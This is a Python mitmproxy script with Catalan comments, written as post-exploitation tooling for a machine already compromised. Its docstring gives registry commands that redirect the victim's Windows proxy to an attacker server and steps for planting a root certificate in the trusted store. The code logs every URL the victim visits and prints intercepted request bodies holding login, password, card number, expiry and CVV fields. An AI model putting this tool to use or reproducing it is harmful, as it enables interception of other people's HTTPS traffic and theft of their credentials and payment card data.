#!/usr/bin/env python3

from urllib.parse import urlparse
from modules.my_utils import show_message
from modules.exit_handler import setup_signal_handler

### Info ##################################################################################################################

r"""

    La idea d'aquest script es executar-ho a una maquina que ja ha estat vulnerada 
    Aixo vol dir que ja tenim access a la maquina (Per terminal o per acces remot).

    Com executar l'script:

    ```Shell
    mitmproxy/mitmdump -s https_sniffer.py
    ```

    Per executar aquest Script es neccesari que la maquina victima tengui activat un proxy
    Suposarem que tenim acces per terminal (PowerShell o CMD):

    ```PowerShell

    reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyEnable /t REG_DWORD /d 1 /f

    reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings" /v ProxyServer /t REG_SZ /d "[IP_SERVIDOR_PROXY]:8080" /f

    ```

    Ves a mitm.it i descarrega els certificats per Windows, obre l'executable:
        1) Welcome to the Certificate Import Wizard: Current User
        2) File to Import: Leave default
        3) Private Key Protection: Leave default. Don't put password!
        4) Certificate Store -> Place all certificates in the following store -> Browse -> Certificate Store: Trusted Root Certification Authorities

"""

### Functions #######################################################################################################################

def has_keywords(data, keywords):
    return any(keyword in data for keyword in keywords)

def request(packet):

    url = packet.request.url
    parsed_url = urlparse(url)
    scheme = parsed_url.scheme
    domain = parsed_url.netloc
    path = parsed_url.path

    show_message("URL visitada port la victima", "", "{scheme}://{domain}{path}")

    keywords = [
        "user", "username", "login", "email", "mail", "phone", "pass", "password", "cc", "cardnumber", "card_num", 
        "cardno", "ccnum", "cc_number", "creditcard", "credit_card", "debitcard", "debit_card", "exp", "expdate", 
        "expiry", "expiration", "exp_month", "exp_year", "cvc", "cvv", "cvv2", "security_code", "zip", "postal", "billing"
    ]

    data = packet.request.get_text()

    if has_keywords(data, keywords):
        show_message("Posibles credenciales capturadas:", "info", f"\t{data}")

### Main Code #######################################################################################################################

def main():

    try:
        from mitmproxy import http
    
    except ImportError as e:
        show_message("Executa:", "error", "mitmproxy/mitmdump -s https_sniffer.py")
        return

    show_message("Executing:", "info", "HTTPS Sniffer")

if __name__ == "__main__":
    main()
